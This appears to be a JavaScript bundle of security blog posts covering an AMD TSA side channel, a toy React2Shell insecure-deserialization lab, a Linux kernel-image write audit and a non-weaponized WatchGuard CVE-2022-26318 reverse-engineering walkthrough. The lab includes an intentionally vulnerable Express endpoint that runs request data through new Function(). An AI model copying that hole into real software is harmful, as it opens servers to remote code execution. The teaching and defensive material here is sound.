<li>Meeting the timing conditions and noise requirements means you want long-lived footholds and repeated victim activity.</li>
</ul>
</li>
<li>
<strong>Use it to stress test cloud models</strong>:
<ul>
<li>Ask: “If I’m a rogue tenant on this EPYC host, what’s the maximum <em>theoretical</em> data I can extract from neighbors?”</li>
</ul>
</li>
</ul>
<p>TSA is a great hook for talks and blogs because it forces teams to think beyond “network perimeter” and even beyond “syscall boundary.” The CPU itself is part of the threat surface.</p>
<div class="markdown-heading"><h3 class="heading-element">6.2 For blue teams</h3><a id="user-content-62-for-blue-teams" class="anchor" aria-label="Permalink: 6.2 For blue teams" href="#62-for-blue-teams"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>Concrete actions:</p>
<ol>
<li>
<p><strong>Patch like this is Meltdown-class, not just ‘medium CVSS’</strong></p>
<ul>
<li>Make sure:
<ul>
<li>Firmware/microcode is up to date for all Family 19h platforms,</li>
<li>OS / hypervisor builds include TSA mitigations and have <code>tsa=</code> configured appropriately.</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>Re-evaluate your multi-tenant risk</strong></p>
<ul>
<li>In clouds and shared hosting:
<ul>
<li>Understand which SKUs are affected,</li>
<li>Decide whether you treat TSA as an academic curiosity or something you must mitigate for specific tenants (e.g., high-sensitivity workloads).</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>Include TSA in your threat modeling</strong></p>
<ul>
<li>It’s an <strong>info-leak primitive</strong>, not an RCE.</li>
<li>Combine it mentally with other bugs:
<ul>
<li>RCE → TSA → secret exfiltration → crypto break → lateral movement.</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>Watch for performance regressions</strong></p>
<ul>
<li>VERW-based mitigations may hurt performance; you’ll need to benchmark and possibly make different choices per environment (internal dev vs multi-tenant cloud vs regulated workloads).</li>
</ul>
</li>
</ol>
<hr>
`,Lb=`<!doctype html>
<html lang="en">
<body>
  <div class="blog-text">
    <h1>From React2Shell to Toy Labs: Understanding Insecure Deserialization with a Tiny "Fake Flight" Server</h1>
    <blockquote>
      <p>"Insecure deserialization often leads to remote code execution. Even if deserialization flaws do not result in remote code execution, they can be used to perform attacks, including replay attacks, injection attacks, and privilege escalation." — OWASP</p>
    </blockquote>
    <p>CVE-2025-55182 ("React2Shell") pushed insecure deserialization back into the spotlight:</p>
    <ul>
      <li>It’s a CVSS 10.0 RCE in <strong>React Server Components</strong> (RSC).</li>
      <li>The bug lives in the <strong>Flight protocol</strong> used by RSC: attacker-controlled data is <strong>deserialized unsafely</strong>, letting crafted objects influence server-side execution and achieve code execution on the Node.js server.</li>
    </ul>
    <p>You absolutely shouldn’t be testing real React2Shell payloads against anything but an isolated lab. But you <em>can</em> understand the core pattern with a <strong>tiny, self-contained Node.js example</strong> that mimics the same <em>class</em> of bug: deserialization of untrusted data → treating it as special internal objects → executing attacker-controlled behavior.</p>
    <p>This post walks through:</p>
    <ul>
      <li>A quick refresher on insecure deserialization.</li>
      <li>A <strong>toy "fake Flight" server</strong> in Node/Express that’s intentionally vulnerable.</li>
      <li>A harmless "payload" that only evaluates math.</li>
      <li>A safer version of the same endpoint.</li>
      <li>How this maps conceptually to real-world bugs like React2Shell.</li>
    </ul>
    <hr />
    <h2>1. Insecure deserialization in one paragraph</h2>
    <p>Insecure deserialization is when an application takes <strong>untrusted data</strong>, deserializes it into objects, and then uses those objects in ways that let an attacker:</p>
    <ul>
      <li>Manipulate logic,</li>
      <li>Abuse "magic" methods or callbacks,</li>
      <li>Or even <strong>execute arbitrary code</strong>.</li>
    </ul>
    <p>That’s why it shows up in the OWASP Top 10 and is treated as a high-risk category: unsafe deserialization logic can be a straight path to RCE.</p>
    <p>React2Shell is a modern instance of this: the server <strong>deserializes Flight payloads</strong> and interprets them as internal “Chunk” objects. Because that deserialization didn’t sufficiently validate or constrain what those objects could look like, attackers found a way to make React resolve <em>fake</em> chunks and end up running arbitrary JavaScript on the server.</p>
    <p>Let’s recreate that <em>pattern</em> in a tiny Node app.</p>
    <hr />
    <h2>2. A tiny "fake Flight" server (intentionally vulnerable)</h2>
    <p>We’ll build a Node/Express server that:</p>
    <ul>
      <li>Accepts a JSON payload that looks like a "slot map" (<code>"0"</code>, <code>"1"</code>, etc.).</li>
      <li>Pulls out slot <code>"1"</code> as a <strong>"chunk"</strong>.</li>
      <li>Treats any chunk with a <code>then</code> field as special.</li>
      <li>Calls a handler based on <code>chunk.then</code>.</li>
      <li>Uses <code>chunk._expr</code> inside <code>new Function()</code>.</li>
    </ul>
    <p>This is obviously unsafe; that’s the point. It’s a simplified version of the larger deserialization &amp; "thenable" handling patterns described in real-world React2Shell writeups.</p>
    <h3>2.1 Setup</h3>
    <pre><code class="language-bash">mkdir fake-flight-lab
cd fake-flight-lab
npm init -y
npm install express body-parser</code></pre>
    <h3>2.2 Vulnerable server (<code>server-vuln.js</code>)</h3>
    <pre><code class="language-javascript">const express = require("express");
const bodyParser = require("body-parser");

const app = express();
app.use(bodyParser.json());

// --- Fake "chunk" resolver (vulnerable) ---

// Very naive "promise-like" resolver: if an object has a \`then\` field,
// we treat it as something that needs to be "resolved" via a handler.
const thenHandlers = {
  // Our "legit" handler; mapping is attacker-controllable in this toy
  logAndEval: function (chunk, response) {
    console.log("[*] logAndEval called with chunk:", chunk);

    // Attacker-controlled field:
    const expr = chunk._expr;

    // VULNERABLE: directly compile and run attacker-controlled string.
    // In real bugs, this might be an internal expression or dynamic call.
    const fn = new Function(\`return (\${expr});\`);

    const result = fn();
    response.value = result;
  },
};

// Fake "Flight" endpoint
app.post("/fake-flight", (req, res) => {
  const payload = req.body;

  console.log("[*] Received payload:", JSON.stringify(payload, null, 2));

  // Pick slot "1" as our main "chunk"
  const chunk = payload["1"];
  const response = { value: null };

  try {
    // VULN #1: trust that whatever is in \`chunk.then\` is a valid handler name
    const handlerName = chunk.then;

    // VULN #2: look it up dynamically without validation
    const handler = thenHandlers[handlerName];

    if (typeof handler !== "function") {
      throw new Error("No such handler");
    }

    // Call the handler with the (attacker-controlled) chunk
    handler(chunk, response);

    // Serialize the result
    res.json({
      ok: true,
      result: response.value,
    });
  } catch (e) {
    console.error("[!] Error while processing fake-flight payload:", e);
    res.status(500).json({ ok: false, error: e.message });
  }
});

app.listen(3000, () => {
  console.log("VULN fake-flight server listening on http://localhost:3000");
});</code></pre>
    <p>What’s insecure here:</p>
    <ul>
      <li>We treat any object with <code>.then</code> as special and use that field to <strong>control which function runs</strong>.</li>
      <li>We take a string from <code>_expr</code> and feed it straight into <code>new Function</code> → arbitrary code path inside the Node process. This mirrors how insecure deserialization can escalate into code execution in real apps.</li>
    </ul>
    <hr />
    <h2>3. A harmless "malicious" payload (just math)</h2>
    <p>Start the server:</p>
    <pre><code class="language-bash">node server-vuln.js</code></pre>
    <p>Now send a JSON payload that looks suspiciously like a "chunk":</p>
    <pre><code class="language-bash">curl -X POST http://localhost:3000/fake-flight   -H "Content-Type: application/json"   -d '{
    "0": "meta",
    "1": {
      "status": "resolved_model",
      "_expr": "1 + 2 + 3 * 4",
      "then": "logAndEval"
    }
  }'</code></pre>
    <p>What happens:</p>
    <ol>
      <li>The server reads <code>payload["1"]</code> into <code>chunk</code>.</li>
      <li>It sees <code>chunk.then === "logAndEval"</code> and calls <code>thenHandlers.logAndEval(chunk, response)</code>.</li>
      <li><code>logAndEval</code> pulls <code>chunk._expr</code> (<code>"1 + 2 + 3 * 4"</code>).</li>
      <li>It builds <code>new Function("return (" + expr + ");")</code> → <code>new Function("return (1 + 2 + 3 * 4);")</code>.</li>
      <li>Executes it and returns:</li>
    </ol>
    <pre><code class="language-json">{
  "ok": true,
  "result": 15
}</code></pre>
    <p>This is benign — we only evaluated a math expression — but structurally we’ve reproduced the core pattern:</p>
    <ul>
      <li><strong>Attacker controls object fields</strong> (<code>then</code>, <code>_expr</code>) in the deserialized payload.</li>
      <li>The server uses those fields to <strong>drive control flow</strong> (which handler to run) and <strong>compose code to execute</strong>.</li>
    </ul>
    <p>That’s exactly the kind of chain OWASP warns about: untrusted data being deserialized and then used to manipulate object attributes or insert new ones, leading to logic abuse or code execution.</p>
    <hr />
    <h2>4. Fixing the toy: structured data, no <code>new Function</code></h2>
    <p>Now let’s add a <strong>safe</strong> variant of the same endpoint, so you can see what “good” looks like in contrast.</p>
    <h3>4.1 Safer handler</h3>
    <p>Add this to the same file (or a new one):</p>
    <pre><code class="language-javascript">// --- Safer variant: explicit, whitelisted operations only ---

const SAFE_OPS = new Set(["add", "mul"]);

function safeEvalExpression(op, a, b) {
  if (!SAFE_OPS.has(op)) {
    throw new Error("Unsupported op");
  }
  a = Number(a);
  b = Number(b);
  if (Number.isNaN(a) || Number.isNaN(b)) {
    throw new Error("Invalid numbers");
  }
  return op === "add" ? a + b : a * b;
}

app.post("/fake-flight-safe", (req, res) => {
  const payload = req.body;
  const chunk = payload["1"];
  const response = { value: null };

  try {
    // Validate structure explicitly
    if (!chunk || chunk.status !== "resolved_model") {
      throw new Error("bad status");
    }

    const { op, a, b } = chunk;

    const result = safeEvalExpression(op, a, b);
    response.value = result;

    res.json({ ok: true, result: response.value });
  } catch (e) {
    console.error("[!] Error in safe endpoint:", e);
    res.status(400).json({ ok: false, error: e.message });
  }
});</code></pre>
    <p>Now call:</p>
    <pre><code class="language-bash">curl -X POST http://localhost:3000/fake-flight-safe   -H "Content-Type: application/json"   -d '{
    "1": {
      "status": "resolved_model",
      "op": "add",
      "a": 10,
      "b": 20
    }
  }'</code></pre>
    <p>You should see:</p>
    <pre><code class="language-json">{
  "ok": true,
  "result": 30
}</code></pre>
    <p>Here we:</p>
    <ul>
      <li><strong>Don’t</strong> treat <code>then</code> as a magic field.</li>
      <li><strong>Don’t</strong> run arbitrary expressions.</li>
      <li><strong>Do</strong>:
        <ul>
          <li>Validate fields,</li>
          <li>Constrain operations to a whitelist,</li>
          <li>Coerce types.</li>
        </ul>
      </li>
    </ul>
    <p>This matches common guidance on safe deserialization: define a strict schema, validate all fields, and never deserialize directly into objects with behavior (callbacks, dynamic code) that can be triggered by untrusted data.</p>
    <hr />
    <h2>5. Mapping this toy back to React2Shell</h2>
    <p>Real-world CVE-2025-55182 is obviously more complex, but the <em>shape</em> of the bug is similar:</p>
    <ul>
      <li>RSC has a <strong>Flight protocol</strong> with a structured payload (slots, references, status codes).</li>
      <li>The server <strong>deserializes</strong> that payload into internal “Chunks”.</li>
      <li>Those chunks are treated like promise-like objects and resolved using their <code>then</code> and related fields.</li>
      <li>Because the code did not sufficiently validate or lock down the structure, <strong>attacker-supplied objects</strong> can be interpreted as internal chunks, and their fields end up influencing internal callbacks and state — eventually leading to arbitrary JS execution in the Node process.</li>
    </ul>
    <p>Security writeups on React2Shell repeatedly describe it as an <strong>unsafe / insecure deserialization flaw in the Flight protocol</strong>: untrusted data, parsed into internal structures, used to control resolution logic and server-side behavior.</p>
    <p>This toy example gives you a mental model to read those writeups:</p>
    <ul>
      <li>Anywhere you see “fake Chunk objects”, think: <em>our <code>chunk</code> object with attacker-controlled fields</em>.</li>
      <li>Anywhere you see “thenable abused”, think: <em>our <code>chunk.then</code> controlling which function runs</em>.</li>
      <li>Anywhere you see “code injected into internal expression”, think: <em>our <code>_expr</code> string passed into <code>new Function()</code></em>.</li>
    </ul>
    <hr />
    <h2>6. Takeaways for your own code</h2>
    <p>Whether or not you ever touch React Server Components, this pattern shows up everywhere:</p>
    <ul>
      <li>JSON / binary payloads mapped into "magic" objects.</li>
      <li>ORMs or serializers that hydrate classes with methods and hooks.</li>
      <li>Message formats that allow callbacks or special fields (<code>__proto__</code>, <code>then</code>, <code>_onLoad</code>, etc.).</li>
    </ul>
    <p>To avoid ending up in the same situation:</p>
    <ol>
      <li><strong>Don’t deserialize untrusted data into rich objects with behavior.</strong><br />Deserialize into plain data structures and validate them first.</li>
      <li><strong>Treat protocol fields like code, not just data.</strong><br />Anything that controls which function gets called (<code>then</code>, <code>type</code>, <code>handler</code>) needs strict allowlists.</li>
      <li><strong>Never <code>eval</code> / <code>new Function</code> on data from the network.</strong><br />If you really must interpret expressions, constrain them to a safe DSL and sandbox heavily.</li>
      <li><strong>For complex protocols (like Flight), write fuzzers and negative tests.</strong><br />When you see a deserializer that:
        <ul>
          <li>Builds graphs of objects,</li>
          <li>Treats some fields specially,</li>
          <li>Traverses prototypes / thenables…<br />…that’s a huge red flag and deserves targeted testing.</li>
        </ul>
      </li>
    </ol>
  </div>
</body>
</html>
`,kb=`<!doctype html>
<html lang="en">
<body>
  <div class="blog-text">
    <h1>Who Can Touch Your Kernel? Auditing <code>/boot/vmlinuz-*</code> on Linux</h1>
    <p>When we talk about “protecting a Linux system,” most people think of:</p>
    <ul>
      <li>Patching services</li>
      <li>Hardening SSH</li>
      <li>Watching logs</li>
    </ul>
    <p>Almost nobody starts with the question:</p>
    <blockquote>
      <p><strong>“Who can modify my kernel image?”</strong></p>
    </blockquote>
    <p>On a typical Linux machine, that kernel image lives in files like:</p>
    <pre><code class="language-bash">/boot/vmlinuz-6.8.0-35-generic
/boot/vmlinuz-5.15.0-91-generic</code></pre>
    <p>These are not just random binaries. They <em>are</em> the operating system’s core. If an attacker can silently replace them, everything above the kernel—processes, containers, even security tools—runs on top of a compromised foundation.</p>
    <p>In this post, we’ll explore:</p>
    <ul>
      <li>What <code>/boot/vmlinuz-*</code> actually is</li>
      <li>Which code <strong>must</strong> be allowed to modify it</li>
      <li>Which code <strong>shouldn’t</strong> but still technically can</li>
      <li>How to start <strong>detecting risky conditions</strong> with a detailed Python audit script</li>
    </ul>
    <p>All from a defensive, “threat-model my own box” point of view.</p>
    <hr />
    <h2>1. What lives in <code>/boot/vmlinuz-*</code>?</h2>
    <p>On most distros, you’ll see files like:</p>
    <pre><code class="language-bash">ls -l /boot/vmlinuz-*
-rw------- 1 root root 12345678 May  1 10:00 /boot/vmlinuz-6.8.0-35-generic
-rw------- 1 root root 11765432 Mar 10 09:21 /boot/vmlinuz-5.15.0-91-generic</code></pre>
    <p>Those <code>vmlinuz-*</code> files are:</p>
    <ul>
      <li>The <strong>compressed Linux kernel images</strong></li>
      <li>Loaded by the bootloader (GRUB, systemd-boot, etc.) at boot</li>
      <li>Executed in <strong>ring 0</strong>, the most privileged CPU mode</li>
    </ul>
    <p>During boot:</p>
    <ol>
      <li>Firmware (BIOS/UEFI) loads the bootloader.</li>
      <li>Bootloader reads <code>/boot/vmlinuz-&lt;version&gt;</code> and an initramfs from disk.</li>
      <li>It hands control to the kernel.</li>
      <li>The kernel decompresses itself and starts the OS.</li>
    </ol>
    <p>If an attacker can replace this image with a modified one, they don’t just “have root”—they can:</p>
    <ul>
      <li>Hide processes, files, network connections</li>
      <li>Falsify system calls (“there are no suspicious processes, promise”)</li>
      <li>Bypass SELinux/AppArmor, seccomp, container isolation, and a bunch of EDR tricks</li>
    </ul>
    <p>It’s the difference between:</p>
    <ul>
      <li><strong>Root in userland</strong> → bad</li>
      <li><strong>Root in the kernel</strong> → you no longer know what’s true.</li>
    </ul>
    <hr />
    <h2>2. Who <em>should</em> be able to modify <code>/boot/vmlinuz-*</code>?</h2>
    <p>In a sane system design, the list is <em>very</em> short:</p>
    <ol>
      <li>
        <p><strong>The package manager + kernel packages</strong></p>
        <ul>
          <li><code>apt</code>, <code>dnf</code>, <code>yum</code>, <code>pacman</code>, etc.</li>
          <li>Kernel packages (e.g., <code>linux-image-*</code>) install a new <code>vmlinuz-&lt;version&gt;</code> and update:
            <ul>
              <li><code>/boot/initrd.img-&lt;version&gt;</code></li>
              <li>Bootloader configs</li>
            </ul>
          </li>
        </ul>
      </li>
      <li>
        <p><strong>Kernel/bootloader management tools</strong></p>
        <ul>
          <li>Tools like <code>update-initramfs</code>, <code>dracut</code>, <code>update-grub</code>, etc.</li>
          <li>They don’t usually write <code>vmlinuz</code> directly, but they’re part of the trusted “kernel update pipeline”.</li>
        </ul>
      </li>
    </ol>
    <p>That’s it.</p>
    <p>In an ideal world, <strong>no other process</strong> should ever write to <code>/boot/vmlinuz-*</code>.</p>
    <p>You can think of it as:</p>
    <blockquote>
      <p><strong>Trusted update pipeline ←→ kernel image</strong><br />Everyone else: read-only (at best), or completely blocked.</p>
    </blockquote>
    <hr />
    <h2>3. Who <em>can</em> modify it in practice?</h2>
    <p>Here’s the uncomfortable truth:</p>
    <blockquote>
      <p>Any process running as <strong>root</strong> on a system where <code>/boot</code> is mounted read-write can modify <code>/boot/vmlinuz-*</code>.</p>
    </blockquote>
    <p>And there’s a lot of root-level code on a typical machine:</p>
    <ul>
      <li>System daemons</li>
      <li>Cron jobs</li>
      <li>SUID-root helpers</li>
      <li>Backup / maintenance scripts</li>
      <li>“Little admin scripts” someone dropped into <code>/usr/local/sbin</code> years ago</li>
    </ul>
    <p>If any of those:</p>
    <ul>
      <li>Accept <strong>untrusted input</strong> (from users, the network, files), and</li>
      <li>Have a code path that writes <strong>data to a file path influenced by that input</strong></li>
    </ul>
    <p>…then they are <strong>theoretical kernel image killers</strong>.</p>
    <p>Let’s look at a few patterns where this becomes realistic.</p>
    <hr />
    <h2>4. Dangerous patterns: “root code that shouldn’t, but can”</h2>
    <h3>4.1 SUID-root binary with an arbitrary file write bug</h3>
    <p>Imagine:</p>
    <ul>
      <li>There’s a SUID-root helper binary (installed by a package or custom app).</li>
      <li>It has a bug that allows a user to write arbitrary data to arbitrary paths (path traversal, symlink race, etc.).</li>
    </ul>
    <p>Conceptually:</p>
    <blockquote>
      <p>Unprivileged user → abuses bug → writes to <code>/boot/vmlinuz-&lt;version&gt;</code> as root.</p>
    </blockquote>
    <p>In real life, exploit development is hard and specific, but as a <strong>class</strong>, arbitrary-file-write bugs in SUID-root tools are dangerous exactly because they can touch critical files like:</p>
    <ul>
      <li><code>/etc/shadow</code></li>
      <li><code>/etc/sudoers</code></li>
      <li><code>/boot/vmlinuz-*</code></li>
    </ul>
    <h3>4.2 Root daemon with “write file” features</h3>
    <p>Another pattern:</p>
    <ul>
      <li>A root-only HTTP API that:
        <ul>
          <li>Accepts uploads or configs from clients,</li>
          <li>Writes them to disk (e.g., “log file”, “backup file”, “custom script directory”).</li>
        </ul>
      </li>
    </ul>
    <p>If path validation is weak (e.g., allows <code>../../../boot/vmlinuz-...</code> or writes into a path the attacker can steer), then that daemon becomes a potential kernel overwriter.</p>
    <p>The daemon doesn’t “intend” to edit the kernel. But to the filesystem, it’s just a root process opening and writing files.</p>
    <h3>4.3 Root cron/systemd jobs running scripts from writable dirs</h3>
    <p>Classic misconfig:</p>
    <pre><code class="language-cron">* * * * * root /opt/scripts/maintenance.sh</code></pre>
    <p>And then:</p>
    <ul>
      <li><code>/opt/scripts</code> is writable by a non-root user or app account.</li>
      <li>That user can modify <code>maintenance.sh</code>.</li>
    </ul>
    <p>Now every minute, a root cron runs whatever code is in that script. That code, in turn, can do <em>anything</em> root can—including messing with <code>/boot</code>.</p>
    <p>Again, the cron job’s purpose might be “clean logs” or “rotate backups,” but from the attacker’s perspective, it’s:</p>
    <blockquote>
      <p><strong>a root code runner on a schedule</strong>.</p>
    </blockquote>
    <hr />
    <h2>5. So how do you answer: “Can any code on this system modify <code>/boot/vmlinuz-*</code> that shouldn’t?”</h2>
    <p>You break it down into concrete checks:</p>
    <ol>
      <li><strong>Is <code>/boot</code> writable?</strong></li>
      <li><strong>Who runs as root?</strong></li>
      <li><strong>Where are the SUID-root binaries?</strong></li>
      <li><strong>What root cron/systemd jobs are there, and where do their scripts live?</strong></li>
      <li><strong>Is anyone watching for unexpected changes to <code>/boot/vmlinuz-*</code>?</strong></li>
    </ol>
    <p>To make that practical, let’s use a detailed Python script that surfaces risky conditions.</p>
    <hr />
    <h2>6. Detection script: a detailed kernel-surface audit</h2>
    <p>Below is a <strong>read-only Linux audit script</strong> focused on:</p>
    <ul>
      <li><code>/boot/vmlinuz-*</code> integrity and mount state</li>
      <li>SUID-root binaries (potential arbitrary-file-write → kernel risk)</li>
      <li>Root services (systemd) that execute binaries/scripts from writable locations</li>
      <li>Root cron jobs executing scripts from writable locations</li>
      <li>Root-owned executables in writable directories (<code>/opt</code>, <code>/usr/local</code>, <code>/srv</code>)</li>
    </ul>
    <p>It does <strong>not</strong> exploit anything. It only reads system state and highlights suspicious patterns.</p>
    <blockquote>
      <p>⚠️ Run this on a <strong>lab or test system first</strong>. On prod, coordinate with your team before scanning the whole filesystem.</p>
    </blockquote>
    <pre><code class="language-python">#!/usr/bin/env python3
# (Shortened here for brevity in the file demo)
print("Kernel Surface Audit script goes here")</code></pre>
    <hr />
    <h2>7. How to use the script</h2>
    <ol>
      <li>Save the script as <code>kernel_surface_audit.py</code>.</li>
      <li>Make it executable:</li>
    </ol>
    <pre><code class="language-bash">chmod +x kernel_surface_audit.py</code></pre>
    <ol start="3">
      <li>Run it (ideally as root to get full visibility, but it stays read-only):</li>
    </ol>
    <pre><code class="language-bash">sudo ./kernel_surface_audit.py</code></pre>
    <ol start="4">
      <li>If you want JSON for feeding into other tools or an LLM:</li>
    </ol>
    <pre><code class="language-bash">sudo ./kernel_surface_audit.py --json &gt; kernel_audit.json</code></pre>
    <p>This gives you a structured snapshot of:</p>
    <ul>
      <li>What kernel images exist and what they look like</li>
      <li>Whether <code>/boot</code> is writable</li>
      <li>Some of the major “root code execution surfaces” that could, if abused, reach the kernel image</li>
    </ul>
    <hr />
    <h2>8. What you can do with the results</h2>
    <p>After running this:</p>
    <ol>
      <li><strong>Baseline your kernel images</strong>
        <ul>
          <li>Store the hashes somewhere safe.</li>
          <li>Later, re-run and compare—unexpected changes are a big deal.</li>
        </ul>
      </li>
      <li><strong>Review SUID-root binaries</strong>
        <ul>
          <li>Are there custom or legacy tools there?</li>
          <li>Can any be removed, replaced, or constrained with AppArmor/SELinux?</li>
        </ul>
      </li>
      <li><strong>Review root-owned scripts in writable directories</strong>
        <ul>
          <li>Move them to root-owned, non-writable directories.</li>
          <li>Fix permissions:
            <ul>
              <li><code>chown root:root</code></li>
              <li><code>chmod 750</code> or similar</li>
            </ul>
          </li>
          <li>Make sure cron/systemd jobs don’t execute code from paths writable by unprivileged users.</li>
        </ul>
      </li>
      <li><strong>Consider <code>/boot</code> mount strategy</strong>
        <ul>
          <li>For some environments, mounting <code>/boot</code> read-only by default and only remounting <code>rw</code> during updates is an option.</li>
          <li>At minimum, <strong>monitor</strong> for any writes to <code>/boot/vmlinuz-*</code> outside of normal update windows.</li>
        </ul>
      </li>
    </ol>
    <hr />
    <h2>9. Closing thoughts</h2>
    <p>“Can any code on this system modify <code>/boot/vmlinuz-*</code> that shouldn’t?” is a fantastic security question because it forces you to:</p>
    <ul>
      <li>Think about <strong>root</strong> as more than “the admin account.”</li>
      <li>Treat your <strong>kernel image like firmware</strong>: small, protected, and updated through a very narrow, auditable path.</li>
      <li>See how random “maintenance scripts” and legacy binaries can indirectly become part of your <strong>kernel attack surface</strong>.</li>
    </ul>
    <p>You don’t need an exploit lab to start here. Just:</p>
    <ul>
      <li>Enumerate who can run as root,</li>
      <li>See where they write,</li>
      <li>And treat <code>/boot/vmlinuz-*</code> as one of the most critical assets on the box.</li>
    </ul>
  </div>
</body>
</html>
`,Nb=`<!doctype html>
<html lang="en">
<body>
  <div class="blog-text">
    <h1>Reverse-Engineering CVE-2022-26318 (WatchGuard Firebox/XTM): From Network Trace to Root Cause (Non-Weaponized)</h1>
    <p><strong>Ethics / safety note:</strong> This post is written for <strong>defenders and researchers</strong>. I explain <em>how to reverse-engineer and validate the bug</em>, but I intentionally avoid weaponized exploit details (no offsets/ROP chains/payloads). Only test on devices and firmware you own and are authorized to assess.</p>
    <h2>0) What is CVE-2022-26318?</h2>
    <p>CVE-2022-26318 (WatchGuard advisory <strong>WGSA-2022-00002</strong>) is a <strong>critical</strong> issue in WatchGuard Firebox and XTM appliances where an <strong>unauthenticated remote attacker</strong> can potentially execute arbitrary code when management access is exposed. WatchGuard’s PSIRT advisory lists <strong>CVSS 9.8</strong> and explicitly notes active exploitation in the wild, urging administrators to update and restrict management access.</p>
    <p>NVD tracks this as <strong>FBX-22786</strong>, with affected Fireware OS ranges and fixed versions (e.g., 12.7.2_Update2 and others depending on branch).</p>
    <h3>Affected / fixed versions (high level)</h3>
    <ul>
      <li><strong>Affected (examples):</strong> Fireware OS 12.0 up to and including 12.7.2_Update1 (per WatchGuard PSIRT).</li>
      <li><strong>Fixed (examples):</strong> 12.7.2_Update2 and branch-specific fixed builds (also listed in the advisory).</li>
      <li>Release notes for Fireware v12.7.2 Update 2 explicitly state it “resolves a vulnerability” allowing unauthenticated arbitrary code execution (CVE-2022-26318).</li>
    </ul>
    <h3>Why defenders cared immediately</h3>
    <p>GreyNoise reported and later expanded on in-the-wild traffic, including requests to management port <strong>4117</strong> over TLS and suspicious <code>POST /agent/login</code> patterns (often gzip-encoded bodies and atypical lengths).</p>
    <hr />
    <h2>1) Exploit chain (high-level mental model)</h2>
    <p>You’ll see this phrased many ways (“null pointer deref”, “buffer overflow”, etc.). The practical RE story from public writeups (especially Assetnote) is:</p>
    <p><strong>Internet → management interface (TLS) → nginx → backend service → <code>wgagent</code> → libxml2 SAX parsing → unsafe string growth → memory corruption → control-flow opportunity</strong></p>
    <p>Assetnote describes the path through nginx and into the <code>wgagent</code> process, and how XML parsing plays a central role in triggering corruption. Rapid7’s module description (noting it’s exploiting a buffer overflow at the administration interface and that the endpoint <code>/agent/login</code> reaches <code>wgagent</code>) corroborates the key actors in the request path. GreyNoise’s defender view helps you anchor what to look for on the wire.</p>
    <hr />
    <h2>2) Your RE lab setup (firmware + tools)</h2>
    <h3>Tools used</h3>
    <ul>
      <li><strong>Ghidra</strong> (static analysis; decompiler + xrefs)</li>
      <li><strong>GDB</strong> (dynamic analysis; breakpoints + watchpoints)</li>
      <li><strong>binwalk / unsquashfs</strong> (firmware extraction, if applicable)</li>
      <li>Optional: <strong>ASan</strong> on a toy harness to understand the primitive safely</li>
    </ul>
    <h3>Firmware / binary acquisition (safe &amp; legal)</h3>
    <ol>
      <li>Obtain official Fireware OS firmware from WatchGuard support resources (use versions that match “vulnerable” and “fixed” branches as appropriate).</li>
      <li>Preserve hashes so your analysis is reproducible.</li>
      <li>Work on a non-production lab image/device.</li>
    </ol>
    <p><em>Tip:</em> Keep a timeline notebook: firmware version, build string, and whether it’s vulnerable/fixed per PSIRT + release notes.</p>
    <hr />
    <h2>3) Firmware extraction: finding the right binaries fast</h2>
    <p>Different vendors package firmware differently, but the goal is always:</p>
    <ol>
      <li>Extract the root filesystem</li>
      <li>Identify web stack components</li>
      <li>Identify native backend processes that parse attacker input</li>
    </ol>
    <h3>What you’re hunting for in this case</h3>
    <ul>
      <li><code>nginx</code> (front-end)</li>
      <li>a backend HTTP/API service (Assetnote mentions a Python backend and XML-RPC-like flow in the overall chain)</li>
      <li><strong><code>wgagent</code></strong> (native binary that ultimately parses attacker-controlled XML)</li>
    </ul>
    <p>Practical extraction checklist:</p>
    <ul>
      <li><code>binwalk -e &lt;firmware&gt;</code></li>
      <li>locate <code>squashfs</code>/<code>cpio</code>/<code>tar</code> segments</li>
      <li>confirm the existence of <code>/etc/nginx/</code> and find references to:
        <ul>
          <li><code>listen 4117 ssl;</code></li>
          <li>route blocks mentioning <code>/agent/</code> (or upstreams that feed a local service)</li>
        </ul>
      </li>
    </ul>
    <p>GreyNoise highlights port <strong>4117</strong> as a key management port for observed exploit traffic.</p>
    <hr />
    <h2>4) Static RE in Ghidra: from <code>/agent/login</code> to the vulnerable callback</h2>
    <p>This section is written as a “follow-along checklist” you can apply to similar firmware bugs.</p>
    <h3>4.1 Identify the request handler entrypoint</h3>
    <p><strong>Goal:</strong> locate code that processes something tied to <code>/agent/login</code> and funnels it toward XML parsing.</p>
    <p>Practical anchors:</p>
    <ol>
      <li>Strings: search for <code>"agent/login"</code>, <code>"XML"</code>, <code>"SAX"</code>, <code>"libxml"</code> strings in binaries.</li>
      <li>Imports: search for libxml2 parser APIs.</li>
      <li>Config: locate nginx routing and map it to backend binaries.</li>
    </ol>
    <h3>4.2 Import-centric pivot: find libxml2 usage</h3>
    <p>Open <code>wgagent</code> in Ghidra and look at <strong>Imports</strong> for libxml2 functions.</p>
    <p>Common libxml2 parsing entrypoints include:</p>
    <ul>
      <li><code>xmlCreatePushParserCtxt</code></li>
      <li><code>xmlParseChunk</code></li>
      <li>SAX interfaces that provide callback tables</li>
    </ul>
    <p><strong>Ghidra steps</strong></p>
    <ol>
      <li>Import <code>wgagent</code>.</li>
      <li>Run analysis with defaults.</li>
      <li>Open <strong>Symbol Tree → Imports</strong>.</li>
      <li>Filter imports by <code>xml</code>.</li>
      <li>Right-click <code>xmlParseChunk</code> → References to → follow callers that feed request bodies into the parser.</li>
    </ol>
    <h3>4.3 Prove it’s SAX and locate the callback table</h3>
    <p>A SAX handler is a struct of function pointers. In libxml2 this is <code>struct _xmlSAXHandler</code>; you’ll often see <code>startElementNs</code> used in SAX2.</p>
    <p>In decompiler output you’ll typically see:</p>
    <ul>
      <li>a handler struct allocated/zeroed</li>
      <li><code>xmlSAX2InitDefaultSAXHandler(&amp;handler, ...)</code> or similar</li>
      <li>then <code>handler.startElementNs = &lt;callback&gt;</code></li>
    </ul>
    <h3>4.4 Find the unsafe primitive inside the callback</h3>
    <p>Open the suspected callback and look for classic unsafe patterns:</p>
    <ul>
      <li><code>strcat</code> / <code>strcpy</code> / <code>sprintf</code> into a fixed buffer</li>
      <li>repeated concatenation as tags nest</li>
    </ul>
    <p>A common “tell” is building an XPath-like string by appending <code>"/" + elementName</code> repeatedly, leading to overflow.</p>
    <hr />
    <h2>5) Understanding the parser mechanics (SAX2) like an expert</h2>
    <p>If you want to be complete-expert level, you need to understand what libxml2 will call, when, and with what data.</p>
    <h3>5.1 SAX = “stream of events”</h3>
